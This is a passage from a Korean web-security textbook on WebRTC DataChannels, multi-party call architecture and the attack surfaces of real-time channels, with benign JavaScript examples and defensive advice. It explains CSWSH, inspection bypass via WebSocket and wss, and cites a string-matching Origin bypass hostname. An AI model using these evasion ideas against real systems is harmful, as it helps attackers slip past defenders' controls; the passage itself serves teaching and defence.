**DataChannel**은 피어 사이의 임의 애플리케이션 데이터 교환을 가능하게 한다. WebSocket과 같되, P2P이고, 하부 전송의 전달 성질을 커스터마이즈할 수 있다. API는 의도적으로 WebSocket을 닮았다 — 같은 `onerror`·`onclose`·`onopen`·`onmessage` 콜백, 같은 `binaryType`·`bufferedAmount`·`protocol` 필드를 노출한다.

```javascript
var pc = new RTCPeerConnection(iceConfig);
var dc = pc.createDataChannel("namedChannel", { reliable: false });

dc.onopen = function () { dc.send("DataChannel 수립. 피어야 안녕!"); };
dc.onmessage = function (msg) {
  if (msg.data instanceof Blob) { processBlob(msg.data); }
  else                          { processText(msg.data); }
};
pc.ondatachannel = function (evt) { handleChannel(evt.channel); };
```

WebSocket과의 차이가 셋 있다. **DataChannel은 URL이 아니라 `RTCPeerConnection`의 팩토리 메서드로 만들어진다.** 어느 피어든 새 채널을 개시할 수 있다. 그리고 **각 채널은 커스텀 전달·신뢰성 성질로 설정될 수 있다** — WebSocket은 TCP의 신뢰·순서 전달에 고정되어 있었다.

**표 37-4. WebSocket과 DataChannel (HPBN 표 18-2 기준)**

| | WebSocket | DataChannel |
|---|---|---|
| 암호화 | 설정 가능(`ws`/`wss`) | **항상** |
| 신뢰성 | 신뢰(TCP) | **설정 가능** |
| 전달 순서 | 순서 보장 | **설정 가능** |
| 다중화 | 없음(확장) | **있음** |
| 전송 단위 | 메시지 지향 | 메시지 지향 |

첫 행이 이 책의 관점에서 중요하다. **DataChannel은 암호화가 항상 켜져 있다** — DTLS 위에서 돌기 때문에, 애플리케이션이 끌 수 없다. WebSocket은 `ws://`로 평문을 쓸 수 있었지만, DataChannel에는 그런 선택지가 없다. 37.11절이 다룬 "암호화는 필수"라는 WebRTC 원칙이 여기서 API 수준으로 강제된다.

### 순서와 신뢰성 — 부분 신뢰 전달

DataChannel의 진짜 힘은 **신뢰·순서 전달을 따르지 않아도 된다는 데 있다.** 각 채널이 자기 전달·신뢰성 요구를 지정한다.

- 순서 + 신뢰 = TCP와 동일 (WebSocket과 같음)
- **비순서 + 신뢰 = TCP인데 헤드 오브 라인 블로킹이 없는 것** (→ 3.6)
- 부분 신뢰: 재전송 횟수 상한, 또는 재전송 시간 제한

부분 신뢰에는 두 정책이 있으며 상호 배타적이다. **재전송 횟수 정책**은 지정된 횟수보다 많이 재전송하지 않는다. **타임아웃 정책**은 지정된 수명(밀리초)이 지나면 재전송하지 않는다. 둘을 동시에 지정하면 오류다. 이 전략들은 WebRTC 클라이언트가 구현하므로, 애플리케이션은 정책과 파라미터만 정하면 된다 — 타이머나 재전송 카운터를 직접 관리할 필요가 없다.

```javascript
conf = { ordered: false };                              // 신뢰, 비순서
conf = { ordered: true,  maxRetransmits: 3 };           // 순서, 부분 신뢰(횟수)
conf = { ordered: false, maxRetransmitTime: 1000 };     // 비순서, 부분 신뢰(시간)
conf = { ordered: false, maxRetransmits: 0 };           // 비순서, 비신뢰 = 순수 UDP
```

여러 채널을 열어 서로 다른 데이터에 서로 다른 정책을 줄 수 있다 — P2P 채팅에는 신뢰·순서를, 일시적 저우선순위 갱신에는 부분 신뢰·비순서를. 채널들은 같은 SCTP association 위에 다중화되므로 서로 독립적이다.

### 설정·협상과 메시지 크기

DataChannel은 두 방식으로 협상된다. **인밴드 협상**에서는 개시 피어가 `DATA_CHANNEL_OPEN` 메시지 — HTTP/2의 HEADERS 프레임처럼 새 스트림을 여는 — 를 보내 채널의 타입·신뢰성·프로토콜을 알린다. **아웃오브밴드 협상**에서는 `negotiated: true`로 이 메시지를 건너뛰고, 양 피어가 같은 `id`를 시그널링 채널로 공유한다. 후자는 참여 피어가 많을 때, 시그널링 서버가 같은 서술을 모두에게 동시에 배포할 수 있어 유용하다.

부분 신뢰 채널에는 애플리케이션이 **메시지 크기**에 각별히 주의해야 한다. WebRTC는 SCTP 패킷의 MTU를 1,280바이트(IPv6 최소 권장 MTU)로 잡는데, IP·UDP·DTLS·SCTP 오버헤드 약 130바이트를 빼면 패킷당 약 1,150바이트가 남는다. 손실률 1%인 링크에서 120KB 메시지를 비신뢰 채널로 보내면 약 107개 패킷으로 쪼개지고, 그중 하나라도 잃으면 **메시지 전체가 버려진다.** 그래서 비신뢰 채널에서는 이상적으로 각 메시지가 단일 패킷(약 1,150바이트 미만)에 들어가야 하고, 그럴 수 없으면 재전송 전략을 써야 한다. 이것은 4.5절이 UDP 애플리케이션에 준 "경로 MTU를 초과하지 말라"는 권고가 DataChannel 설계 제약으로 나타난 것이다.

## 37.13 WebRTC 사용 사례, 다자 아키텍처, 인프라 용량 계획

WebRTC의 중심 사용 사례는 P2P 오디오·비디오 스트리밍과 데이터 교환이다. 그러나 내장 서비스가 많아도, 효율적 P2P 애플리케이션 설계는 여전히 상당한 계획을 요구한다 — P2P가 그 자체로 고성능을 뜻하지는 않는다.

### 대역폭의 벽

HD 스트림은 1~2Mbps의 대역폭을 요구한다. 여기에 결정적 비대칭이 있다. **대부분의 ISP·통신사 연결은 비대칭이다** — 다운링크가 업링크보다 훨씬 크고, 10대 1의 비율도 드물지 않다(예: 다운 10Mbps, 업 1Mbps). 그래서 단일 P2P 오디오·비디오 스트림 하나가 사용자 대역폭의 상당 부분을 잡아먹을 수 있고, 특히 모바일에서 업링크가 병목이 된다.

### 다자 아키텍처

이 비대칭이 다자 통화의 아키텍처를 지배한다. 일대일 커넥션은 관리가 쉽다. 그러나 N자 통화에서 각 피어가 다른 모든 피어에 연결하는 **메시(mesh)** 는 피어당 N-1개, 전체 N×(N-1)개의 커넥션을 만든다. 업링크가 낮으므로 이 아키텍처는 참여자 몇만으로도 대부분의 링크를 포화시킨다.

대안은 **스타(star) 토폴로지**다. 개별 피어가 "슈퍼노드"에 연결하고, 슈퍼노드가 스트림을 모두에게 분배한다. 그러면 한 피어만 N-1개 스트림을 다루는 비용을 치른다. 슈퍼노드는 다른 피어일 수도, 실시간 데이터 처리·분배에 특화된 전용 서비스일 수도 있다. 많은 화상 회의 솔루션이 "프록시 서버"로 개별 스트림을 모아 합성하고 최적화된 버전을 각 참여자에게 분배한다 — 각 클라이언트가 N-1개가 아니라 하나의 스트림만 보게 하는 것이다.

이 아키텍처 선택에는 신뢰 경계의 함의가 있다. **슈퍼노드나 프록시 서버가 개별 스트림을 합성·최적화하려면, 그것들을 복호화해야 한다.** 즉 종단 간 암호화(37.11)가 슈퍼노드에서 끊긴다. 순수 P2P에서는 두 피어만이 미디어를 볼 수 있었지만, 스트림 처리를 위한 중앙 프록시를 두는 순간 그 프록시가 모든 미디어를 볼 수 있는 신뢰받는 제3자가 된다. 성능(중앙 최적화)과 신뢰 경계(종단 간 암호화 유지)가 여기서 정면으로 맞선다.

### 인프라 용량 계획

순수 P2P라는 이름과 달리, 모든 WebRTC 애플리케이션은 중앙 인프라를 요구한다.

- **시그널링 서비스.** 저지연 전송 수단(WebSocket, 또는 XHR과 SSE)을 쓰고, 모든 사용자의 시그널링 속도를 감당할 용량을 확보한다. 커넥션 수립 후에는 시그널링을 DataChannel로 옮겨 중앙 서버 부하를 줄일 수도 있다.
- **STUN 서버.** NAT·방화벽의 만연으로 대부분의 애플리케이션이 IP 조회를 위해 STUN을 요구한다. 커넥션 수립에만 쓰이지만 STUN 프로토콜을 말할 수 있어야 하고 질의 부하를 감당해야 한다. **내부망 전용이 아니라면 항상 STUN 서버를 제공하라** — 없으면 대부분의 커넥션이 실패한다.
- **TURN 서버.** STUN이 있어도 8~10%의 커넥션은 네트워크 정책 탓에 실패한다(예: UDP 전면 차단). 신뢰할 만한 경험을 위해 TURN 릴레이가 필요하다. 릴레이는 부최적이다 — 네트워크 홉이 하나 더 붙고, 스트림당 1Mbps 이상이면 어떤 서비스의 용량도 쉽게 포화시킨다. 그래서 TURN은 항상 최후 수단이며 각별한 용량 계획을 요구한다.

이 목록이 이 장의 논지를 요약한다. **"P2P"는 서버가 없다는 뜻이 아니다.** 시그널링·STUN·TURN·다자 프록시 — 각각이 하나의 중앙 지점이자 하나의 신뢰 경계다. WebRTC는 미디어 경로를 P2P로 만들지만, 그 경로를 세우고 유지하는 제어 평면은 여전히 중앙집중적이며, 그 제어 평면의 보안이 곧 세션 전체의 보안이 된다.

> **이 책의 범위를 넘어서**
>
> 이 장은 다섯 원서의 범위 안에서 실시간 채널을 다뤘다. 그 이후 웹 플랫폼은 이 영역을 크게 확장했다 — QUIC(HTTP/3) 위에서 도는 새로운 양방향 전송, 브라우저의 원시 데이터그램 API, 다자 미디어를 위한 전용 서버 아키텍처, 미디어 프레임을 애플리케이션이 직접 인코딩·조작하는 저수준 API가 그것이다. 이 주제들은 이 책이 근거로 삼은 다섯 권의 범위를 벗어나므로 이름을 들지 않고 여기서 멈춘다. 그러나 이 장이 세운 분석 틀 — 커넥션의 수명이 판정의 빈도를 결정하고, 새 전송 계층이 HTTP 계층의 통제를 우회하며, 종단 간 암호화가 방어자에게도 양날이라는 — 은 그 새 기술들에도 그대로 적용된다.

## 37.14 실시간 채널의 공격 표면 정리

이 장이 다룬 세 채널을 하나의 표로 정리한다. 각 채널이 (a) 어떤 신뢰 경계를 새로 만드는가, (b) HTTP 계층의 어떤 통제를 우회하는가, (c) 방어는 무엇인가.

**표 37-5. 실시간 채널의 공격 표면**

| | SSE | WebSocket | WebRTC |
|---|---|---|---|
| **전송 계층** | 장수명 HTTP 응답 | HTTP 업그레이드 후 TCP | UDP + DTLS + SRTP/SCTP |
| **(a) 새 신뢰 경계** | 없음 — HTTP 그대로 | 업그레이드 후 커넥션이 HTTP가 아니게 됨 | 브라우저↔브라우저 직접 연결; STUN/TURN/시그널링이라는 제3자 |
| **판정 시점** | 요청 시 (CORS) | **핸드셰이크 한 번**, 이후 재확인 없음 | 세션 수립 시; 시그널링 채널이 신뢰 앵커 |
| **(b) 우회하는 HTTP 통제** | (거의 없음) 단, 비인식 중간자가 스트림 버퍼링 | **WAF·접근 제어·콘텐츠 필터** — 업그레이드 후 프레임은 검사 불가; `wss`는 조직 검사 프록시도 우회 | HTTP 계층 전체 — 미디어는 UDP 위; NAT/방화벽 통과가 목적 |
| **인증 전달** | 쿠키 자동 첨부 (일반 HTTP) | **쿠키 자동 첨부 → CSWSH** | DTLS는 인증 안 함 — 애플리케이션이 신원 검증 |
| **출처 통제** | CORS (34.7) | **`Origin` 헤더 — 서버가 검증해야만 유효** | `getUserMedia` 권한이 출처 단위; 시그널링은 애플리케이션 책임 |
| **암호화** | HTTP → `https`로 선택 | `ws`(평문)/`wss`(TLS) — 선택 | **항상**(DTLS 필수) |
| **(c) 핵심 방어** | `https`로 중간자 버퍼링 회피 | **`Origin` 정확 검증 + 비쿠키 인증 + `wss`** | 시그널링 채널 TLS 보호 + 애플리케이션 수준 피어 인증 + 종단 간 암호화 유지 |
| **DoS 표면** | 커넥션당 서버 자원 점유 | 커넥션당 자원 점유; 장수명 유휴 세션 | TURN 릴레이 대역폭; 시그널링 서버 부하 |

이 표에서 세 개의 패턴이 반복된다.

**첫째, 커넥션이 오래 살수록 판정이 드물어진다.** SSE는 요청 시 CORS로 판정되지만 그 커넥션이 몇 시간 살아 있다. WebSocket은 핸드셰이크 한 번에 모든 것을 걸고, 이후 재확인이 없다. 이 사실의 가장 무거운 결과는 **권한 변경의 반영 실패**다. 사용자가 로그아웃하거나, 권한이 취소되거나, 세션이 만료되어도, **이미 열려 있는 실시간 채널은 그것을 모른다.** 요청마다 세션을 확인하던 모델(→ 23장)에서는 다음 요청에서 즉시 반영됐지만, 장수명 채널에서는 애플리케이션이 명시적으로 채널을 끊지 않는 한 낡은 권한이 계속 유효하다. 이것이 실시간 채널이 24장의 접근 제어 모델에 던지는 새 숙제다.

**둘째, 새 전송 계층은 HTTP 계층의 통제를 우회한다.** 이것은 결함이 아니라 설계다 — WebSocket은 HTTP 인프라와 호환되기 위해 업그레이드를 쓰지만, 업그레이드의 목적 자체가 HTTP를 벗어나는 것이다. WebRTC는 NAT와 방화벽을 통과하기 위해 UDP를 쓰지만, 그 통과가 곧 HTTP 계층 통제의 우회다. **방어자가 HTTP 요청 단위로 세워 둔 모든 통제 — WAF, 접근 제어, 콘텐츠 검사, 로깅 — 는 이 경계에서 시야를 잃는다.** 12.11절이 WAF의 한계를, 13.12절이 중간자가 무엇을 파싱할 수 있는지를 다룬 것이, 여기서 실시간 채널이라는 구체적 사각지대로 나타난다.

**셋째, 종단 간 암호화는 방어자에게 양날이다.** `wss://`는 투명 프록시의 오작동과 조작을 막지만, 동시에 조직 자신의 보안 검사 프록시도 막는다. WebRTC의 DTLS 필수화는 TURN 릴레이 운영자가 미디어를 읽는 것을 막지만, 다자 최적화를 위한 중앙 프록시를 두는 순간 그 암호화가 끊긴다. **"경로의 누구도 볼 수 없다"는 성질은, 그 경로에 방어자가 두고 싶은 검사 지점이 있을 때 정확히 그 지점도 무력화한다.** 이것은 이 장에 국한된 역설이 아니라 이 책 전체가 반복해 온 것 — 암호화가 기밀성을 주는 대가로 가시성을 뺏는다는 것 — 의 실시간 채널 버전이다.

세 채널의 방어를 한 문장으로 압축하면 이렇다. **SSE는 HTTP 그대로이므로 HTTP의 방어가 그대로 적용된다. WebSocket은 HTTP를 벗어나므로 핸드셰이크에 모든 검증을 걸어야 한다 — `Origin` 정확 검증, 비쿠키 인증, `wss`. WebRTC는 서버를 벗어나므로 서버가 통제할 수 있는 유일한 지점 — 시그널링과 애플리케이션 수준 인증 — 에 방어를 집중해야 한다.**

## 이 장의 요약

- **실시간 전송은 폴링에서 P2P까지의 스펙트럼이며, 각 지점은 지연·오버헤드·복잡도를 맞바꾼다.** 폴링만이 구조적 지연을 만들고, 나머지는 큐잉 지연을 제거한다. 어떤 방식도 전파 지연 자체는 줄이지 못한다. 최적의 선택은 애플리케이션의 지연 목표를 정의한 뒤에야 가능하다.

- **SSE는 새 신뢰 경계를 만들지 않는다.** 장수명 HTTP 응답 위의 서버→클라이언트 단방향 UTF-8 스트림이며, 출처 통제는 CORS 그대로다. 유일한 주의점은 스트림을 이해하지 못하는 중간자가 이벤트를 버퍼링하는 것이고, 처방은 `https`다.

- **WebSocket 핸드셰이크가 HTTP라는 사실이 두 결과를 낳는다.** `Origin`과 쿠키가 자동으로 붙고(→ CSWSH), 업그레이드가 성공하면 커넥션이 HTTP 통제의 시야를 벗어난다(→ WAF 무력화). 업그레이드는 홉 단위 협상이므로 비인식 중간자가 있으면 깨진다(→ 9.2).

- **`Origin` 헤더는 서버가 검증하지 않으면 아무것도 막지 못한다.** 그리고 브라우저 밖 클라이언트는 그것을 위조할 수 있으므로, `Origin` 검증은 CSWSH를 막는 방어이지 임의 클라이언트의 접속을 막는 방어가 아니다 — 후자는 인증의 몫이다. 검증은 문자열 포함이 아니라 출처 전체 일치로 해야 한다.

- **CSWSH는 단방향 CSRF를 양방향 데이터 탈취로 바꾼다.** WebSocket이 양방향이므로 하이재킹된 채널은 서버가 미는 데이터를 읽어 유출한다. 방어는 세 겹 — CSRF 토큰, 비쿠키 인증, `Origin` 검증.

- **WebRTC는 브라우저를 브라우저와 직접 잇는 순간 새 신뢰 경계를 만든다.** UDP·NAT·STUN·TURN·DTLS는 4장이 세운 것을 그대로 쓴다. DTLS는 암호화만 하고 인증은 애플리케이션에 위임하며, TURN 릴레이와 다자 프록시는 종단 간 암호화가 끊기는 중앙 신뢰 지점이 된다.

- **"P2P"는 서버가 없다는 뜻이 아니다.** 시그널링·STUN·TURN·다자 프록시가 각각 중앙 지점이자 신뢰 경계다. 미디어 경로는 P2P이되 제어 평면은 중앙집중적이며, 제어 평면의 보안이 세션 전체의 보안이다.

- **세 채널의 공통 위험은 커넥션의 수명에서 온다.** 판정이 커넥션 수립 시점 한 번으로 압축되므로, 이미 열린 채널은 이후의 권한 변경을 반영하지 못한다. 그리고 새 전송 계층은 HTTP 계층의 통제를 설계상 우회하며, 종단 간 암호화는 방어자의 검사 지점까지 무력화하는 양날이다.

## 이어지는 장

이 장으로 Part VII이 닫힌다. 32장부터 여기까지, 이 부는 브라우저를 축으로 클라이언트 측 공격 표면을 훑었다 — XSS, 요청 위조, 동일 출처와 CORS, 클라이언트 측 인젝션, 로컬 프라이버시, 그리고 실시간 채널. 이 부가 반복해 물은 질문은 하나였다. **브라우저가 강제하는 경계 — 동일 출처 — 는 어디서 성립하고 어디서 무너지는가.** 실시간 채널은 그 질문의 마지막 변주였다. 커넥션이 오래 살고, 프레이밍이 HTTP가 아니며, 판정이 한 번으로 압축될 때 그 경계에 무슨 일이 일어나는가.

다음 부는 무대를 다시 서버로 옮긴다. 그러나 돌아가는 서버는 32장 이전의 서버가 아니다. Part VIII은 **GraphQL** — 하나의 엔드포인트, 하나의 스키마, 클라이언트가 질의 형태를 정하는 API — 을 다룬다. 이 장에서 마지막으로 언급된 GraphQL 서브스크립션이 그 다리다. 서브스크립션이 WebSocket을 쓰기에 CSWSH에 노출됐다는 사실(→ 33.7, 37.7)은, GraphQL이 이 책이 다룬 모든 전송 계층 위에서 도는 애플리케이션 계층이라는 것을 미리 보여 준다.

38장이 물어야 하는 질문은 이 부 전체가 준비해 준 것이다. **클라이언트가 응답의 형태를 스스로 정하는 API에서, 서버는 무엇을 신뢰 경계로 삼는가.** 질의의 깊이는 누가 제한하는가. 스키마는 얼마나 드러나는가. 하나의 엔드포인트에 걸린 인가는 필드 단위로 어떻게 강제되는가. 이 장이 실시간 채널에서 본 "판정 시점이 압축되는" 문제가, GraphQL에서는 "판정 대상이 확산되는" 문제로 나타난다.

> **원서 대조**
>
> 37.1절: HPBN 15·16·17장의 실시간 전송 논의를 종합했다. XHR 폴링·롱 폴링이 매 메시지 HTTP 오버헤드를 문다는 서술, 전송 수단을 바꿔도 전파 지연이 아니라 큐잉 지연만 제거된다는 핵심, 그리고 각 방식의 지연·오버헤드·방향 특성이 원서 근거다. 표 37-1은 이 책이 34.9절의 폴링·롱 폴링 논의와 HPBN 17장의 "XHR·SSE·WebSocket 통신 흐름" 비교를 확장해 구성했다. "실시간은 애플리케이션마다 다르다"는 정의는 HPBN 15장에서 인용했다.
>
> 37.2~37.3절: HPBN 16장(Server-Sent Events) 전체 기준. `EventSource` API 코드, 이벤트 스트림 프로토콜의 `data`·`event`·`id`·`retry` 필드와 개행 경계, `Last-Event-ID` 재연결, UTF-8 전용과 base64 33% 오버헤드, gzip 압축 권고, CORS 옵트인, 그리고 SSE 비인식 중간자의 버퍼링 문제와 TLS 처방이 모두 원서에서 인용되었다. 예제의 `example.com`을 `www.joes-hardware.com`으로 옮겼다. 중간자 버퍼링을 9.7·13.11절과 연결한 것은 이 책의 편집이다.
>
> 37.4~37.6절: HPBN 17장(WebSocket) 전체 기준. WebSocket API 코드, `ws`/`wss` 스킴의 유래, 텍스트·바이너리 송수신과 `binaryType`, `bufferedAmount`와 헤드 오브 라인 블로킹, 서브프로토콜 협상, 바이너리 프레이밍(FIN·opcode·mask·페이로드 길이)과 클라이언트 프레임 마스킹이 캐시 포이즈닝을 막는다는 서술, 프로토콜 확장(다중화·압축), HTTP 업그레이드 핸드셰이크의 다섯 `Sec-WebSocket-*` 헤더와 101 응답, Key/Accept의 SHA-1+GUID 계산, `Origin` 자동 첨부와 CORS, 메시지 오버헤드 비교표, 커스텀 프로토콜이 브라우저 서비스를 우회한다는 서술, 캐싱 불가와 XHR 병행 전략, 인프라 배포의 세 지점과 Nginx 타임아웃 예시, 투명 프록시에 대한 Key/Accept의 불충분함과 WSS 처방이 모두 원서에서 인용되었다. 표 37-2는 HPBN 17장의 오버헤드 수치다. 업그레이드를 9.2·11.12절의 홉 단위 협상과 연결하고, 장수명 세션을 DoS 표면으로 짚은 것은 이 책의 편집이다.
>
> 37.7절: HPBN 17장의 "Proxies, Intermediaries, and WebSockets" 및 커스텀 프로토콜의 쿠키 검증 NOTE와, BHGQL 9장(Cross-Site WebSocket Hijacking) 전체를 종합했다. `Origin` 헤더를 서버가 검증해야 하며 미검증 시 무의미하다는 것, 허가되지 않은 출처에 403을 돌려줘야 한다는 것, 쿠키가 아닌(JWT 등) 인증이 크로스 사이트 메시지를 막는다는 것, 문자열 포함 검사의 우회(`books.example.com.attacker.net`)가 BHGQL 근거다. 핸드셰이크가 쿠키를 자동 첨부한다는 것과 업그레이드 후 HTTP 계층 검사가 무력해진다는 것은 HPBN과 이 책의 8.6·12.11·13.12절을 결합한 서술이다. CSWSH 코드 예제는 33.7절과 일관되게 온라인 서점으로 옮겼다. `Origin`이 브라우저 밖에서 위조 가능하므로 검증이 CSWSH 방어이지 접속 통제가 아니라는 구분은 8.6절 원칙에서 도출한 이 책의 편집이다.
>
> 37.8~37.13절: HPBN 18장(WebRTC) 전체 기준. 세 API(MediaStream·RTCPeerConnection·RTCDataChannel), W3C/IETF 워킹그룹 분담, `getUserMedia` 제약과 코드, 오디오·비디오 엔진, UDP 선택의 이유와 네 비서비스, RTCPeerConnection의 역할, 시그널링을 애플리케이션에 위임하는 설계와 SIP/Jingle/ISUP, SDP 오퍼-앤서 워크플로와 JSEP, ICE 에이전트의 후보 수집(host·srflx)과 STUN 바인딩·TURN 폴백, Trickle ICE, DTLS가 TLS의 최소 수정이며 2왕복을 요구하고 자체 서명 인증서로 인증을 애플리케이션에 위임한다는 것, SRTP/SRTCP의 패킷 구조와 키를 DTLS에서 얻는다는 것, SCTP의 TCP/UDP/SCTP 비교표와 부분 신뢰 확장 및 IP 위에서 못 쓰는 이유, DataChannel의 WebSocket 대비표와 순서·신뢰성 설정 및 부분 신뢰 정책, MTU 1,280과 120KB 메시지 예시, 대역폭 비대칭, 메시·스타 토폴로지와 슈퍼노드, 시그널링·STUN·TURN 용량 계획과 8~10% 실패율이 모두 원서에서 인용되었다. 표 37-3은 HPBN 표 18-1, 표 37-4는 표 18-2다. UDP·NAT·STUN·TURN·DTLS의 상세는 4장에서 이미 다뤘으므로 역참조하고 재설명하지 않았다. `getUserMedia` 권한을 34.1절 출처와, DTLS를 17.7·17.8·18.3절과, SCTP를 4.3절과, 슈퍼노드의 복호화를 종단 간 암호화의 신뢰 경계로 연결한 것은 이 책의 편집이다. 범위 상자의 네 주제(QUIC 기반 실시간, 원시 데이터그램 API, 전용 미디어 서버, 저수준 미디어 코덱 API)는 다섯 권의 범위 밖이므로 이름을 들지 않고 한 문단으로 처리했다.

> 37.14절: 이 장 전체와 12.11·13.12·23·24장을 종합해 이 책이 구성한 정리 절이다. 표 37-5의 세 채널 비교는 원서들의 개별 서술을 신뢰 경계·HTTP 통제 우회·방어의 세 축으로 재배치한 것이며, 장수명 커넥션이 권한 변경을 반영하지 못한다는 관찰과 종단 간 암호화가 방어자에게 양날이라는 관찰은 이 책의 편집이다.
